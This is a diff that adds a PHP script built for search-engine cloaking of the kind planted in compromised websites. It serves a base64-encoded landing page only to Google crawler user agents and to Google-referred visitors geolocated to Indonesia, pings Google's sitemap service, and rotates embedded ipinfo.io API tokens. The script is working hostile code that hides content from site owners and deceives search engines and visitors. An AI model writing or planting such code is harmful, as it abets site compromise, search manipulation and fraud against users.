@@ -1,0 +1,233 @@
+<?php
+error_reporting(0);
+session_start();
+
+$lp_data = 'aseloley==';
+$redirect_contry = [
+    'ID'
+];
+$allow_user_agents = [
+    'googlebot',
+    'mediapartners',
+    'storebot-google',
+    'google-inspectiontool',
+    'googleother',
+    'google-extended',
+    'apis-google',
+    'google-mobile',
+    'feedfetcher',
+    'googleproducer',
+    'support.google.com',
+    'google-speakr',
+    'google-site-verification',
+    'appengine-engine',
+    'google web preview',
+    'google-xrawler',
+    'google-structured',
+    'google-physicalweb',
+    'google-favicon',
+    'google-certificates',
+    'google-read-aloud',
+    'google-safety',
+    'developers.google.com',
+    'adsbot-google',
+    'google-adwords'
+];
+
+$keys = [
+    'active' => [
+        'eee78f001e837c',
+        '0617fd6bd9fdb4',
+        '3e75591855da78',
+        '64ce43edd37301',
+        '0c6f0d3af922c3'
+    ],
+    'inactive' => []
+];
+$base_path = dirname(__FILE__);
+$keys_file = $base_path . '/.keys.json';
+
+function getKeys() {
+    global $keys_file;
+
+    return json_decode(file_get_contents($keys_file));
+}
+
+function saveKeys($keys) {
+    global $keys_file;
+    if (function_exists('file_put_contents')) {
+        file_put_contents($keys_file, json_encode($keys));
+    } else {
+        $f = fopen($keys_file, 'w');
+        fwrite($f, json_encode($keys));
+        fclose($f);
+    }
+}
+if (!file_exists($keys_file)) {
+    saveKeys($keys);
+}
+
+$keys_data = getKeys();
+$active_keys = $keys_data->active;
+$inactive_keys = $keys_data->inactive;
+
+if (isset($_SESSION['already_'])) {
+    header('Content-Type: text/html');
+    die(base64_decode($lp_data));
+}
+
+function url() {
+
+    if(isset($_SERVER['HTTPS'])){
+        $protocol = ($_SERVER['HTTPS'] && $_SERVER['HTTPS'] != "off") ? "https" : "http";
+    } else {
+        $protocol = 'http';
+    }
+
+    return $protocol . '://' . $_SERVER['HTTP_HOST'] . '/';
+}
+
+function pingSitemap() {
+    $url_ = 'https://www.google.com/ping?sitemap=' . url();
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        $opt = array(
+            CURLOPT_URL => $url_,
+            CURLOPT_RETURNTRANSFER => 1,
+            CURLOPT_SSL_VERIFYHOST => 0,
+            CURLOPT_SSL_VERIFYPEER => 0
+        );
+        curl_setopt_array($ch, $opt);
+        $content = curl_exec($ch);
+        curl_close($ch);
+        return json_decode($content);
+    } else if (function_exists('file_get_contents')) {
+        $contextOptions = array(
+            "ssl" => array(
+                "verify_peer" => false,
+                "verify_peer_name" => false
+            ),
+        );
+
+        return json_decode(file_get_contents($url_, false, stream_context_create($contextOptions)));
+    } else {
+        return false;
+    }
+
+}
+
+$ip_address = get_client_ip();
+$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "";
+$browser = getBrowser($user_agent);
+$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "";
+
+function ipinfo($ip) {
+    global $active_keys, $inactive_keys;
+    $url_ = "https://ipinfo.io/$ip?token=" . $active_keys[0];
+    $data = false;
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        $opt = array(
+            CURLOPT_URL => $url_,
+            CURLOPT_RETURNTRANSFER => 1,
+            CURLOPT_SSL_VERIFYHOST => 0,
+            CURLOPT_SSL_VERIFYPEER => 0
+        );
+        curl_setopt_array($ch, $opt);
+        $content = curl_exec($ch);
+        curl_close($ch);
+        $data = json_decode($content);
+    } else if (function_exists('file_get_contents')) {
+        $contextOptions = array(
+            "http" => array(
+                "ignore_errors" => true,
+            ),
+            "ssl" => array(
+                "verify_peer" => false,
+                "verify_peer_name" => false
+            ),
+        );
+
+        $data = json_decode(file_get_contents($url_, false, stream_context_create($contextOptions)));
+    }
+
+    if ($data) {
+        if ($data->status == 429) {
+            $prev = $active_keys[0];
+            $active_keys = array_merge(array_diff($active_keys, array($prev)));
+            $inactive_keys[] = $prev;
+            saveKeys([
+                'active' => $active_keys,
+                'inactive' => $inactive_keys
+            ]);
+            return ipinfo($ip);
+        }
+    }
+    return $data;
+}
+
+function get_client_ip() {
+    $ipaddress = '';
+    if(isset($_SERVER['REMOTE_ADDR']))
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    else if (isset($_SERVER['HTTP_CLIENT_IP']))
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    else
+        $ipaddress = 'UNKNOWN';
+    return $ipaddress;
+}
+
+function getBrowser($user_agent)
+{
+    $browser        =   "Unknown";
+    $browser_array  =   array(
+        '/msie/i'       =>  'Internet Explorer',
+        '/firefox/i'    =>  'Firefox',
+        '/safari/i'     =>  'Safari',
+        '/chrome/i'     =>  'Chrome',
+        '/opera/i'      =>  'Opera',
+        '/netscape/i'   =>  'Netscape',
+        '/maxthon/i'    =>  'Maxthon',
+        '/konqueror/i'  =>  'Konqueror',
+        '/mobile/i'     =>  'Handheld Browser'
+    );
+    foreach ($browser_array as $regex => $value) {
+        if (preg_match($regex, $user_agent)) {
+            $browser    =   $value;
+            break;
+        }
+    }
+    return $browser;
+}
+$ipinfo = ipinfo($ip_address);
+foreach($allow_user_agents as $allow_agent) {
+    if (strstr(strtolower($user_agent), $allow_agent)) {
+        $_SESSION['already_'] = 'yes';
+        pingSitemap();
+        die(base64_decode($lp_data));
+    }
+}
+
+if ($referer !== "") {
+
+    $ref_page = parse_url($referer);
+
+    if (stristr($ref_page, 'google.')) {
+        $ipinfo = ipinfo($ip_address);
+        if (in_array($ipinfo->country, $redirect_contry)) {
+            $_SESSION['already_'] = 'yes';
+            pingSitemap();
+            die(base64_decode($lp_data));   
+        }
+    }
+}
+
+?>
